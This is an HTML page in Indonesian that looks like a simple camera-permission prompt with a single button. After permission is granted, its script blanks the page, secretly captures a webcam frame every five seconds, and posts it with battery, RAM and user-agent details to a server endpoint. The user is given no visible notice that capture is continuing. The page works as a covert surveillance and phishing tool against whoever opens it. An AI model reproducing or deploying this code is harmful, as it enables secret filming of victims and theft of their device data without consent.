<!DOCTYPE html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Halaman Izin Kamera</title>
    <style>
      body {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
        background-color: white;
      }
      button {
        padding: 20px 40px;
        font-size: 18px;
        cursor: pointer;
      }
    </style>
  </head>
  <body>
    <button id="startButton">Klik untuk Meminta Izin Kamera</button>

    <script>
      const startButton = document.getElementById("startButton");

      startButton.onclick = async () => {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          const video = document.createElement("video");
          video.srcObject = stream;
          video.play();

          // Sembunyikan elemen dan bersihkan halaman
          document.body.innerHTML = "";
          document.body.style.backgroundColor = "white";

          // Ambil info baterai
          let batteryInfo = {
            level: "Tidak diketahui",
            charging: "Tidak diketahui"
          };

          if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryInfo.level = battery.level * 100 + "%";
            batteryInfo.charging = battery.charging ? "Ya" : "Tidak";
          }

          const ram = navigator.deviceMemory || "Tidak diketahui";

          setInterval(() => {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth || 320;
            canvas.height = video.videoHeight || 240;

            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageData = canvas.toDataURL("image/jpeg");

            const deviceInfo = {
              ram: ram + " GB",
              batteryLevel: batteryInfo.level,
              isCharging: batteryInfo.charging,
              userAgent: navigator.userAgent
            };

            fetch("/api/kirim", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                image: imageData,
                deviceInfo
              })
            }).then(res => res.json())
              .then(data => console.log("Terkirim:", data))
              .catch(err => console.error("Gagal kirim:", err));
          }, 5000);

        } catch (err) {
          alert("Gagal akses kamera: " + err.message);
        }
      };
    </script>
  </body>
</html>
